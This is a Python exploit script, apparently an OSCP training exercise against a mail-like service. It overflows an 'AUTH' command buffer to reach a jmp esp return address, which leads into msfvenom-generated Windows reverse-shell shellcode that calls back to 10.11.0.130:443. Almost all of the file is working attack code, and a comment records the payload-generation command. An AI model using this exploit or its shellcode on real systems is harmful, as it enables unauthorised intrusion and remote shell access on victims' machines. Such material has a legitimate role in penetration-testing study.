#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print("[+] Usage %s host" % sys.argv[0])
    sys.exit()

# address of a jmp esp (ffe4)
ret_addr="\x71\x1d\xd1\x65"


# root@kali:~/oscp/overflowexercise/slmail# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.130 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of c file: 1500 bytes
shellcode =("\xba\x84\x26\x9b\x39\xdb\xda\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x55\x12\x83\xed\xfc\x03\xd1\x28\x79\xcc\x25\xdc\xff"
"\x2f\xd5\x1d\x60\xb9\x30\x2c\xa0\xdd\x31\x1f\x10\x95\x17\xac"
"\xdb\xfb\x83\x27\xa9\xd3\xa4\x80\x04\x02\x8b\x11\x34\x76\x8a"
"\x91\x47\xab\x6c\xab\x87\xbe\x6d\xec\xfa\x33\x3f\xa5\x71\xe1"
"\xaf\xc2\xcc\x3a\x44\x98\xc1\x3a\xb9\x69\xe3\x6b\x6c\xe1\xba"
"\xab\x8f\x26\xb7\xe5\x97\x2b\xf2\xbc\x2c\x9f\x88\x3e\xe4\xd1"
"\x71\xec\xc9\xdd\x83\xec\x0e\xd9\x7b\x9b\x66\x19\x01\x9c\xbd"
"\x63\xdd\x29\x25\xc3\x96\x8a\x81\xf5\x7b\x4c\x42\xf9\x30\x1a"
"\x0c\x1e\xc6\xcf\x27\x1a\x43\xee\xe7\xaa\x17\xd5\x23\xf6\xcc"
"\x74\x72\x52\xa2\x89\x64\x3d\x1b\x2c\xef\xd0\x48\x5d\xb2\xbc"
"\xbd\x6c\x4c\x3d\xaa\xe7\x3f\x0f\x75\x5c\xd7\x23\xfe\x7a\x20"
"\x43\xd5\x3b\xbe\xba\xd6\x3b\x97\x78\x82\x6b\x8f\xa9\xab\xe7"
"\x4f\x55\x7e\xa7\x1f\xf9\xd1\x08\xcf\xb9\x81\xe0\x05\x36\xfd"
"\x11\x26\x9c\x96\xb8\xdd\x77\x93\x37\xdd\x05\xcb\x45\xdd\x08"
"\xb7\xc3\x3b\x60\xd7\x85\x94\x1d\x4e\x8c\x6e\xbf\x8f\x1a\x0b"
"\xff\x04\xa9\xec\x4e\xed\xc4\xfe\x27\x1d\x93\x5c\xe1\x22\x09"
"\xc8\x6d\xb0\xd6\x08\xfb\xa9\x40\x5f\xac\x1c\x99\x35\x40\x06"
"\x33\x2b\x99\xde\x7c\xef\x46\x23\x82\xee\x0b\x1f\xa0\xe0\xd5"
"\xa0\xec\x54\x8a\xf6\xba\x02\x6c\xa1\x0c\xfc\x26\x1e\xc7\x68"
"\xbe\x6c\xd8\xee\xbf\xb8\xae\x0e\x71\x15\xf7\x31\xbe\xf1\xff"
"\x4a\xa2\x61\xff\x81\x66\x81\xe2\x03\x93\x2a\xbb\xc6\x1e\x37"
"\x3c\x3d\x5c\x4e\xbf\xb7\x1d\xb5\xdf\xb2\x18\xf1\x67\x2f\x51"
"\x6a\x02\x4f\xc6\x8b\x07")


pad = '\x90'* 8

buf = "A"*1040 + ret_addr + pad + shellcode +"C"*(1072-1040-len(ret_addr)-len(pad)-len(shellcode))

req1 = "AUTH " + buf
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print(repr(s.recv(1024)))
     s.send(req1)
     print(repr(s.recv(1024)))
except:
     print "[!] connection refused, check debugger"
s.close()
